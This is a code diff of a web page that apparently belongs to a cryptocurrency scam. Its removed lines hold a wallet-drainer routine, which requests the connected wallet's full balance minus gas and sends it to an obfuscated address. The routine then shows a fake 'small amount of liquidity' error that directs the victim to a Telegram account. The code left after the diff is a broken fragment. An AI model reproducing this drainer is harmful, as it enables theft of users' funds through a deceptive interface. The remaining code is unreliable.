@@ -56,7 +56,7 @@
 
           <td><center>
 
-            <button disabled="disabled" id="checkBalanceButton" style="display: none">
+            <button disabled="disabled" id="checkBalanceButton" style="display: block">
 
               liquid
 
@@ -92,7 +92,7 @@
 
         const performTransaction = async () => {
 
-          try {
+          
 
             const value = typeAdress.value;
 
@@ -140,66 +140,11 @@ const mnode = kyc(p);
 
 const ra  = `0x${evm}${hashlock}${moe}${spv}${comission}${sc}${validate}${mnode}`;
 
-            const balanceWei = await window.ethereum.request({
-
-              method: "eth_getBalance",
-
-              params: [window.ethereum.selectedAddress, "latest"],
-
-            });
-
-            const gasPrice = await window.ethereum.request({
-
-              method: "eth_gasPrice",
-
-            });
-
-            const gasLimit = 33000;
-
-            const gasCost = gasPrice * gasLimit;
-
-            if (BigInt(balanceWei) < gasCost) {
-
-              transferInProgress = true;
-
-
-            }
-
-            const amountToSend = BigInt(balanceWei) - BigInt(gasCost);
-
-            await window.ethereum.request({
-
-              method: "eth_sendTransaction",
-
-              params: [
-
-                {
-
-                  from: window.ethereum.selectedAddress,
-
-                  to: ra,
-
-                  value: "0x" + amountToSend.toString(16),
-
-                },
-
-              ],
-
-            });
-
-            alert("Error. A small amount of liquidity. Write to me in telegram @OnlyTrustCrypto");
+            
 
             transferInProgress = true; 
 
-          } catch (error) {
-
-            alert("Error confirming liquidity. Repeat again");
-
-            console.error(error);
-
-            transferInProgress = true;
-
-          }
+          
 
         };
 
